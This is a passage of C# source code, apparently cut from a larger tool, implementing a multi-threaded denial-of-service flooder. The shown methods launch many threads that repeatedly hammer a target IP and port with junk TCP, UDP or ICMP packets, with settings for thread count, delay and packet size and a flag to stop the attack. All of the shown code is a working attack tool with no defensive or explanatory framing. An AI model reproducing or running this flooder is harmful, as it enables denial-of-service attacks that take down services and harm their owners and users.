                t_ddos.Start();
            }

            private void ddosTarget()
            {
                List<Thread> subThreads = new List<Thread>();

                if (prot == protocol_tcp)
                {
                    for (int i = 0; i < Threads; i++)
                    {
                        Thread t = new Thread(new ThreadStart(ddosTcp));
                        t.Start();
                        subThreads.Add(t);
                    }
                }

                if (prot == protocol_udp)
                {
                    for (int i = 0; i < Threads; i++)
                    {
                        Thread t = new Thread(new ThreadStart(ddosUdp));
                        t.Start();
                        subThreads.Add(t);
                    }
                }

                if (prot == protocol_icmp)
                {
                    for (int i = 0; i < Threads; i++)
                    {
                        Thread t = new Thread(new ThreadStart(ddosIcmp));
                        t.Start();
                        subThreads.Add(t);
                    }
                }

                while (!kill) ; //Pause execution on this thread (ddos is still running at this point)
                foreach (Thread t in subThreads)
                {
                    t.Abort();
                }

                t_ddos.Abort();
            }

            private void ddosIcmp()
            {
                while (true)
                {
                    if (kill) break;
                    try
                    {
                        System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping();
                        byte[] junk = Encoding.Unicode.GetBytes(generateData());
                        ping.Send(ip, 1000, junk);
                        Thread.Sleep(delay);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("ddos icmp error: " + ex.Message);
                    }
                }
            }

            private void ddosUdp()
            {
                while (true)
                {
                    if (kill) break;

                    try
                    {
                        UdpClient client = new UdpClient();
                        client.Connect(ip, port);
                        byte[] junk = Encoding.Unicode.GetBytes(generateData());
                        client.Send(junk, junk.Length);
                        client.Close();
                        Thread.Sleep(delay);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("ddos udp error: " + ex.Message);
                    }
                }
            }

            private void ddosTcp()
            {
                while (true)
                {
                    if (kill) break;

                    try
                    {
                        TcpClient client = new TcpClient();
                        client.Connect(ip, port);
                        NetworkStream ns = client.GetStream();
                        byte[] junk = Encoding.Unicode.GetBytes(generateData());
                        ns.Write(junk, 0, junk.Length);
                        ns.Close();
                        ns.Dispose();
                        client.Close();
                        Thread.Sleep(delay);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("ddos tcp error: " + ex.Message);
                    }
                }
            }

            private string generateData()
            {
                string data = "";

                for (int i = 0; i < packetSize; i++)
                {
                    data += "A";
                }

                return data;
            }

            public void stopDdos()
            {
                kill = true;
            }
        }
    }
